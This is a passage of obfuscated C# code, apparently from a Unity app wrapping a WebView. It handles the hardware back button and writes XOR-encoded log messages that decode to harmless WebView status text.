        WLog(_0x2236f796._0xe98e57cc(new byte[25] { 169, 133, 141, 138, 196, 179, 129, 134, 178, 141, 129, 147, 196, 173, 138, 141, 144, 141, 133, 136, 196, 183, 140, 139, 147 }, 228));
    }

    private bool _0x65c9ed7f()
    {
        if (_0xbcce5559())
            return true;
        if (_0x047ed0fd != null && _0x047ed0fd.CanGoBack)
        {
            WLog(_0x2236f796._0xe98e57cc(new byte[36] { 193, 232, 251, 237, 254, 232, 251, 236, 169, 235, 232, 234, 226, 169, 164, 183, 169, 228, 232, 224, 231, 169, 222, 236, 235, 223, 224, 236, 254, 169, 206, 230, 203, 232, 234, 226 }, 137));
            _0x047ed0fd.GoBack();
            return true;
        }

        return false;
    }

    private GameObject _0x3d0f9fc1;
    internal bool firstLoadShown = false;
    private string _0xd74d47a7;
    private bool _0xbddd781f = false;
    private string _0xccea9ae3 = "";
}

internal static class _0x2236f796
{
    internal static string _0xe98e57cc(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}